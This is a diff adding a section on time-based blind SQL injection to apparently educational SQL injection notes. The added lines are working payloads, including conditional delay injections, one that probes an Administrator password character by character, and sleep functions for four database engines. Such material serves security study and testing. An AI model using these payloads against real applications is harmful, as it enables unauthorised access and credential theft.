@@ -51,6 +51,18 @@ For a UNION query to work, two key requirements must be met:
 > ... TO_CHAR(1/0) ... 
 ```
 
+##### Exploiting blind SQL injection by triggering time delays
+
+```sql
+> '; IF (1=2) WAITFOR DELAY '0:0:10'--
+> '; IF (1=1) WAITFOR DELAY '0:0:10'-- 
+> '; IF (SELECT COUNT(username) FROM Users WHERE username = 'Administrator' AND SUBSTRING(password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'-- 
+
+> dbms_pipe.receive_message(('a'),10) Oracle
+>	WAITFOR DELAY '0:0:10' Microsoft
+>	SELECT pg_sleep(10) PostgreSQL
+>	SELECT sleep(10) MySQL
+```
 
 #### How to detect SQL injection vulnerabilities
 
